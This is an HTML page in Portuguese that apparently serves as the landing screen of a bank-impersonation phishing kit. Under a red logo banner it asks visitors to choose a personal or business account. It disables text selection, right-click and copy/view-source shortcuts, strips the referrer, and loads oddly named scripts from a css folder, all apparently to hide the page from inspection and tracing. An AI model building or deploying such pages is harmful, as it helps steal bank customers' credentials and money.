
<!-- Bloqueios -->
<script>
function disableselect(e){
    return false;
}

function reEnable(){   
    return true;
}

document.onselectstart = function() { return false; }   
document.oncontextmenu = function() { return false; }

if (window.sidebar) {   
    document.onmousedown = disableselect;   
    document.onclick = reEnable;
}

document.onkeydown = function(e) {
  if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 ||  e.keyCode === 117)) {
    alert('Acao nao permitida!');
    return false;
  } else {
          return true;
        }
};
</script>
<!-- Referrer -->
<script>
  var meta = document.createElement('meta');
  meta.name = "referrer";
  meta.content = "no-referrer";
  document.getElementsByTagName('head')[0].appendChild(meta);
</script>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
     <title>Selecione</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="./css2/tiopatas.css" rel="stylesheet">
    <style type="text/css">

    h1, input {
        font-family: "Open Sans", Helvetica, sans-serif;
    }

.account-wall
{
    margin-top: -10px;
    padding: 0px 0px 0px 0px;
    background-color: #f7f7f7;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}
.login-title
{
    color: #555;
    font-size: 18px;
    font-weight: 400;
    display: block;
}
.profile-img
{
    width: 100%;
    height: 50px;
    margin: 5px 0px 0px;
    display: block;
    /*-moz-border-radius: 0%;
    -webkit-border-radius: 0%;
    border-radius: 40%;*/
}

</style>
    <script src="./css/tom-e-jerry.js"></script>
    <script src="./css/patolino.js"></script>
<script language="JavaScript" >

 
</script>	
</head>
<body>


<div class="container">
    <div class="row">
        <div>
            <div class="account-wall">
				<h6 align="center" style=" background-color: #E40B02;"><img src="./img2/logo.png" height="80" width="250"></h6>
				<h5 align="center"><b><font color="ff0000">Atenção!<br></font></b></h5>
				<h5 align="center"><b></b><font color="000">Selecione o tipo de conta</h5> 
		<font color="000"> 
		<br><a target="_self" class="btn btn-lg btn-default btn-block" href="./pf/"><font color="#fff">Pessoa Física</font></a></font>
		<br><font color="000"> 
		<a target="_self" class="btn btn-lg btn-default btn-block" href="./pj/"><font color="#fff">Pessoa Jurídica</font></a></font>
				
<h5 align="center" ><img src="./img2/principal-img.png" height="522" width="100%"></h5>
						<img class="profile-img" src="./img2/secundario-img.png" alt="">
            </div>
        </div>
    </div>
</div>
</body>
</html>
